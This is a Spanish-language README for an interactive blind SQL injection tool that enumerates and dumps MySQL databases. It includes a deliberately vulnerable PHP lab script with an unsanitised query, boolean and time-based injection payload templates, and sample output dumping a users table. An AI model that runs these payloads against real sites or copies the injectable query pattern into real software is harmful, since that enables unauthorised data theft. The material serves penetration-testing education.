# Blind SQLi - Herramienta de Inyeccion SQL a Ciegas

Herramienta interactiva de Blind SQL Injection para enumeracion completa de bases de datos MySQL. Soporta dos tipos de inyeccion (numerica y string) y dos metodos de deteccion (status code y time-based).

## Requisitos

```bash
pip install requests pwntools
```

## Laboratorio de pruebas

Para probar la herramienta crea una base de datos, crea una tabla e introduce campos y columnas en la tabla, despues, crea el siguiente script PHP en `/var/www/html/searchUsers.php`:

```php
<?php
$server = "localhost";
$username = "s4vitar";
$password = "s4vitar123";
$database = "Hack4u";

$conn = new mysqli($server, $username, $password, $database);
$id = $_GET['id'] ?? '';
$data = mysqli_query($conn, "SELECT username FROM users WHERE id = '$id'");
$response = mysqli_fetch_array($data);

if ($response) {
    echo $response['username'];
} else {
    echo "No hay resultados";
}
```

> La query del servidor usa comillas simples (`WHERE id = '$id'`), por lo que el tipo de inyeccion correcto es **String**.

## Uso

```bash
python3 status_code/sqli.py
```

La herramienta pedira de forma interactiva:

1. **URL objetivo** - Endpoint vulnerable (ej: `http://localhost/searchUsers.php`)
2. **Parametro vulnerable** - Parametro inyectable (ej: `id`)
3. **Tipo de inyeccion** - Numerica o String
4. **Metodo de deteccion** - Conditional (Status Code) o Time-Based (Sleep)

## Tipos de inyeccion

### Numerica

Para cuando la query del servidor **no entrecomilla** el parametro:

```sql
-- Query del servidor:
SELECT * FROM users WHERE id = [input]

-- Payload generado:
?id=9 or ascii(substring((query),1,1))=72
```

### String

Para cuando la query del servidor **entrecomilla** el parametro con comilla simple:

```sql
-- Query del servidor:
SELECT * FROM users WHERE id = '[input]'

-- Payload generado (cierra comilla y comenta el resto):
?id=-1' or ascii(substring((query),1,1))=72-- -
```

## Metodos de deteccion

### Conditional (Status Code)

Determina si la condicion es verdadera basandose en el **codigo de respuesta HTTP** (200 = true).

> Requiere que la aplicacion devuelva un status code diferente cuando no hay resultados.

### Time-Based (Sleep)

Determina si la condicion es verdadera midiendo el **tiempo de respuesta** del servidor. Si tarda mas de lo normal, la condicion es verdadera.

> Funciona en practicamente cualquier escenario siempre que la query sea vulnerable.

### Combinaciones posibles

| Tipo | Metodo | Payload ejemplo |
|------|--------|-----------------|
| Numerica | Conditional | `9 or ascii(...)=72` |
| Numerica | Time | `1 and if(ascii(...)=72,sleep(0.35),1)` |
| String | Conditional | `-1' or ascii(...)=72-- -` |
| String | Time | `1' and if(ascii(...)=72,sleep(0.35),1)-- -` |

## Verificacion automatica

Antes de iniciar la fuerza bruta, la herramienta **verifica que la inyeccion funciona** enviando dos condiciones:

- **TRUE**: `or 1=1` (debe devolver resultado positivo)
- **FALSE**: `or 1=2` (debe devolver resultado negativo)

Si ambas devuelven el mismo resultado, la combinacion tipo/metodo no funciona y la herramienta avisa para que pruebes otra.

```
[*] Verificando que la inyeccion funciona...
[+] Inyeccion verificada correctamente (TRUE=diferente de FALSE)
```

```
[-] La inyeccion no funciona con este tipo/metodo (TRUE=True, FALSE=True)
[*] Prueba con otro tipo (numerica/string) o metodo (conditional/time)
```

## Flujo de enumeracion

```
Verificacion
    |
    +-- Bases de datos (information_schema.schemata)
            |
            +-- Seleccionar base de datos
                    |
                    +-- Listar tablas (information_schema.tables)
                            |
                            +-- Seleccionar tabla
                                    |
                                    +-- Listar columnas (information_schema.columns)
                                            |
                                            +-- Dump de todos los datos
```

## Tecnicas utilizadas

- **Fuerza bruta caracter a caracter** - Compara cada posicion con codigos ASCII (33-126)
- **Valores en hexadecimal** - Los nombres de DB/tabla se convierten a hex (`Hack4u` -> `0x4861636b3475`) para evitar conflictos de comillas dentro de la inyeccion
- **group_concat con separador hex** - Usa `separator 0x2c` (coma en hex) para concatenar multiples resultados en un solo string
- **Verificacion previa** - Test automatico TRUE/FALSE antes de empezar para no perder tiempo con una configuracion incorrecta

## Ejemplo

```
  ____  _ _           _   ____   ___  _     _
 | __ )| (_)_ __   __| | / ___| / _ \| |   (_)
 |  _ \| | | '_ \ / _` | \___ \| | | | |   | |
 | |_) | | | | | | (_| |  ___) | |_| | |___| |
 |____/|_|_|_| |_|\__,_| |____/ \__\_\_____|_|

        [ Blind SQL Injection Tool ]
        [    Status Code & Time    ]
        By amis13 (https://github.com/amis13)

[?] URL objetivo: http://localhost/searchUsers.php
[?] Parametro vulnerable: id
[?] Selecciona tipo (1/2): 2     # String
[?] Selecciona metodo (1/2): 2   # Time-Based

[+] URL:       http://localhost/searchUsers.php
[+] Parametro: id
[+] Tipo:      string
[+] Metodo:    time

[*] Verificando que la inyeccion funciona...
[+] Inyeccion verificada correctamente (TRUE=diferente de FALSE)

[*] Extrayendo bases de datos...
[+] Bases de datos: information_schema,Hack4u

============================================================
  BASES DE DATOS
============================================================
+---+--------------------+
| # | Database           |
+---+--------------------+
| 1 | information_schema |
| 2 | Hack4u             |
+---+--------------------+

Selecciona una base de datos: 2

[+] Tablas [Hack4u]: users

Selecciona una tabla: 1
[+] Columnas [users]: id,username,password

[*] Dumpeando todas las columnas de 'users'...

============================================================
  DUMP DE 'Hack4u.users'
============================================================
+---+----+----------+----------+
| # | id | username | password |
+---+----+----------+----------+
| 1 | 1  | admin    | s3cr3t   |
+---+----+----------+----------+

[+] Extraccion completada
```

## Estructura

```
sqli/
├── README.md
└── status_code/
    ├── sqli.py                # Herramienta principal (dinamica)
    ├── sqli_conditional.py    # Script original - Status Code
    └── sqli_time.py           # Script original - Time-Based
```

## Disclaimer

Esta herramienta es solo para fines educativos y pruebas de penetracion autorizadas. El uso indebido contra sistemas sin autorizacion es ilegal.

## Autor

**amis13** - [https://github.com/amis13](https://github.com/amis13)
